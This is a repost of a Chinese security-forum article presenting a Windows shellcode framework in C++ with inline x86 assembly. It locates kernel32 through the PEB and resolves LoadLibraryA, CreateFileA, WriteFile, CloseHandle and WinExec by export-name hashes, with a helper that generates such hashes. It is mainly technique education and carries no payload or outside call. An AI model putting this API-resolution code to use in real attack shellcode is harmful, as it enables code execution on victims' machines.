
# shellcode 框架，纯属娱乐

> 原文：[`www.pediy.com/kssd/pediy12/125853.html`](https://www.pediy.com/kssd/pediy12/125853.html)

这个框架只是为了得到 `LoadLibrary`，以及自己实现了 `GetProcAddress`。

```
// shellcode.cpp : 定义控制台应用程序的入口点。

//

#include "stdafx.h"

#include <windows.h>

void __declspec(naked) shellcode()

{

  __asm

  {

    pushad;

    mov ebp,esp;

    sub esp,2000h;//create a stack

    jmp seh_to_base;

funcs_1://LoadLibraryA:0x75399faf

    __emit 0afh;

    __emit 09fh;

    __emit 039h;

    __emit 075h;

//GetProcAddress:0xdc25496b

    //__emit 06bh;

    //__emit 049h;

    //__emit 025h;

    //__emit 0dch;

//CreateFileA :0x147d9b2b

    __emit 02bh;

    __emit 09bh;

    __emit 07dh;

    __emit 014h;

//WriteFile :0x046d7121

    __emit 021h;

    __emit 071h;

    __emit 06dh;

    __emit 004h;

//CloseHandle :0x15bd1b24

    __emit 024h;

    __emit 01bh;

    __emit 0bdh;

    __emit 015h;

//WinExec :0x04c95129

    __emit 029h;

    __emit 051h;

    __emit 0c9h;

    __emit 004h;

seh_to_base:

    mov esi,fs:[30h];//得到 peb

    mov esi,[esi+0ch];//得到 Ldr

    mov esi,[esi+1ch];//得到 InInitializationOrderModuleList

    mov esi,[esi];//第一个链表的位置。ntdll

    mov esi,[esi+08h];//第二个链表的位置。kernel32

    mov edx,5;

get_base_func:

    push edx;

    push esi;

    push esi;//dll base

    mov eax,funcs_1;

    mov eax,[eax+edx*4-4];

    push eax;

    call getprocaddress;//eax 返回的为函数地址

    pop esi;

    pop edx;

    dec edx;

    jne get_base_func;

    //加载动态链接库

    add esp,2000h;

    popad;

    retn;

getprocaddress://除了 esp，ebp 以外，都可以使用。

    mov esi,[esp+8h];//得到头部偏移地址

    mov eax,[esi+3ch];//pe 偏移

    lea eax,[esi+eax+78h];//数据目录表中导出表的位置

    mov eax,[eax];//导出表的偏移

    lea eax,[esi+eax];

    push eax;

    mov esi,[eax+20h];//函数名偏移

    mov ecx,[eax+18h];

    push esi;

    add esi,[esp+0ch];

    push [esp+0ch];//hash

    push [esp+14h];//dll base

    call strloop;

    pop ecx;

    mov ecx,[ecx+01ch];

    add ecx,[esp+8h];

    lea ecx,[ecx+eax*4-4];

    mov eax,[ecx];

    add eax,[esp+8h];

    ret 8h;

strloop://作用为从一个导出表里面查找一个特定 hash 值的字符串的索引

    mov eax,[esp+0ch];//函数名指针地址表偏移

    mov ebx,[esp+4h];//dll base

    lea eax,[eax+ebx];//函数名指针地址表偏移

    lea eax,[eax+ecx*4-4];//字符串位置

    mov eax,[eax];

    lea edi,[ebx+eax];//得到本次查询函数名的偏移

    xor eax,eax;

    push edx;

    xor edx,edx;

    call hash_loop;

    pop edx;

    cmp eax,[esp+8h];

    jz end;

    dec ecx;

    jne strloop;

end:

    mov eax,ecx;

    ret 0ch;

hash_loop://作用为求一个字符串的 hash 值

    xor dl,byte ptr [edi];

    ror edx,11;

    scasb;

    jne hash_loop;

    mov eax,edx;

    retn;

  }

}

void GenHash()

{

  char * kernel32[] =

  {

    "GetProcAddress",

    "LoadLibraryA",

    "CreateFileA",

    "WriteFile",

    "CloseHandle",

    "WinExec"

  };

  char * ws2_32[] =

  {

    "socket",

    "bind",

    "gethostname",

    "gethostbyname",

    "recv"

  };

  for(int i=0; i<sizeof(kernel32)/4; i++)

  {

    char * tmp = kernel32[i];

    DWORD result = 0;

    __asm

    {

      pushad;

      xor edx,edx;

      xor eax,eax;

      mov edi,tmp;

hash_loop:

      xor dl,byte ptr [edi];

      ror edx,11;

      scasb;

      jne hash_loop;

      lea eax,[result];

      mov [eax],edx;

      popad;

    }

    fprintf(stdout,"%s :0x%08x\n",kernel32[i],result);

  }

}

int _tmain(int argc, _TCHAR* argv[])

{

  //GenHash();

  shellcode();

  return 0;

}
```
